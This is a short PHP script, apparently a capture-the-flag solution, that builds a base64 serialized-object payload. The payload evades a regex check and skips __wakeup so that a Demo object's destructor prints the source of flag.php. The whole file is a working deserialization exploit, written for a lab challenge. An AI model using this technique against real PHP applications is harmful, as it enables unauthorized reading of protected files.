<?php
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the flag.php
            $this->file = 'index.php'; 
        } 
    } 
}
    $b = serialize(new Demo('flag.php'));
    echo "serialize=" . $b . PHP_EOL;
    $b = str_replace('O:4', 'O:+4',$b);
    $b = str_replace(':1:', ':2:',$b);
    echo "ans=" . base64_encode($b) . PHP_EOL;
 ?>